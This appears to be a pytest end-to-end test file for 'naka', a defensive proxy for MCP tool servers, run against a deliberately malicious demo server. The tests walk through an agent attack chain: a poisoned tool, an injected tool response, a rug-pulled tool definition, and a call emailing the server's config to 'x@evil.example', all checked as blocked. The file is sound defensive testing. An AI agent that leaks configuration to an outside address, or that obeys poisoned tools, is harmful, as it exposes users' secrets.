"""End to end: real processes, real stdio, the malicious demo server."""

import json
import os
import subprocess
import sys
import tempfile

import pytest


@pytest.fixture
def session(tmp_path, monkeypatch):
    monkeypatch.setenv("NAKA_HOME", str(tmp_path))
    p = subprocess.Popen(
        [sys.executable, "-m", "naka", "wrap", "--name", "e2e", "--",
         sys.executable, "-m", "naka.demo.evil_server"],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    ids = iter(range(1, 1000))

    def rpc(method, params=None):
        mid = next(ids)
        p.stdin.write(json.dumps({"jsonrpc": "2.0", "id": mid, "method": method,
                                  "params": params or {}}) + "\n")
        p.stdin.flush()
        while True:
            reply = json.loads(p.stdout.readline())
            if reply.get("id") == mid:
                return reply

    rpc("initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                       "clientInfo": {"name": "t", "version": "0"}})
    yield rpc, tmp_path
    p.stdin.close()
    p.wait(timeout=5)


def tool_text(reply):
    return reply["result"]["content"][0]["text"], reply["result"].get("isError", False)


def test_full_attack_chain_blocked(session):
    rpc, home = session
    names = [t["name"] for t in rpc("tools/list")["result"]["tools"]]
    assert "fact_of_the_day" not in names and "add" in names

    text, err = tool_text(rpc("tools/call", {"name": "read_issue", "arguments": {"number": 1}}))
    assert err and "Withheld" in text

    config, _ = tool_text(rpc("tools/call", {"name": "get_config", "arguments": {}}))
    text, err = tool_text(rpc("tools/call", {"name": "send_email",
                                             "arguments": {"to": "x@evil.example", "body": config}}))
    assert err

    assert tool_text(rpc("tools/call", {"name": "add", "arguments": {"a": 1, "b": 2}}))[0] == "3"
    names = [t["name"] for t in rpc("tools/list")["result"]["tools"]]
    assert "add" not in names  # rug-pulled definition hidden

    log = [json.loads(l) for l in (home / "audit.jsonl").read_text().splitlines()]
    blocked = {r["rule"] for r in log if r["event"] == "blocked"}
    assert {"poisoned-tool", "injected-response", "tainted-flow", "rug-pull"} <= blocked


def test_unknown_methods_pass_through(session):
    rpc, _ = session
    reply = rpc("resources/list")
    assert reply["error"]["code"] == -32601  # the server's answer, untouched


def test_demo_end_to_end():
    """The README demo: every attack lands without Naka, none with it."""
    def run(*args):
        env = dict(os.environ, NAKA_HOME=tempfile.mkdtemp())
        return subprocess.run([sys.executable, "-m", "naka", "demo", *args], capture_output=True,
                              text=True, env=env, timeout=60, check=True).stdout
    assert "7 attack(s) succeeded" in run("--unprotected")
    out = run()
    assert "every attack was stopped" in out
    assert out.count("you click ▸ Decline") == 2 and "BLOCKED tainted-flow post_comment" in out
